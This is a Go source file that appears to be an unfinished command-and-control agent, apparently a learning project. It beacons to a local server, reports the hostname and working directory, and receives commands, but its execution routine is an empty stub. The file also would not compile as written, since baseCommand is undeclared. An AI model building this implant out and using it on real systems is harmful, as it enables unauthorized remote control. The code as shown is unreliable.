package main

import (
	"commons/commons"
	"crypto/md5"
	"encoding/gob"
	"encoding/hex"
	"log"
	"net"
	"os"
	"strings"
	"time"
)

var (
	message  commons.Message
	waitTime = 5
)

const (
	SERVER = "127.0.0.1"
	PORT   = "9090"
)

func init() {
	message.AgentHostname, _ = os.Hostname()
	message.AgentCWD, _ = os.Getwd()
	message.AgentId = makeId()
}

func main() {
	log.Println("Started Execution")

	for {
		channel := connectServer()
		defer channel.Close()

		// Send message to server
		gob.NewEncoder(channel).Encode(message)

		// Receive server message
		gob.NewDecoder(channel).Decode(&message)

		if messageContainsCommands(message) {
			for index, command := range message.Commands {
				message.Commands[index].Response = executeCommand(command.Command)
			}
		}

		time.Sleep(time.Duration(waitTime) * time.Second)
	}

}

func executeCommand(command string) (response string) {
	// Separate the command and the arguments
	// htb -> modify the wait time
	// htb 10 -> modify the wait time to 10 seconds

	separatedCommand := strings.Split(strings.TrimSuffix(command, "\n"), " ")

	baseCommand = separatedCommand[0]

	switch baseCommand {
	case "htb":
		//
	default:
		//
	}

	return response
}
func messageContainsCommands(serverMessage commons.Message) (response bool) {
	response = false
	if len(serverMessage.Commands) > 0 {
		response = true
	}
	return response
}

func connectServer() (channel net.Conn) {
	channel, err := net.Dial("tcp", SERVER+":"+PORT)
	if err != nil {
		log.Fatalf("Error connecting to server: %v", err)
	} else {
		log.Println("Connected to server")
	}
	return channel
}

func makeId() string {
	myTime := time.Now().String()

	hasher := md5.New()
	hasher.Write([]byte(message.AgentHostname + myTime))

	return hex.EncodeToString(hasher.Sum(nil))
}
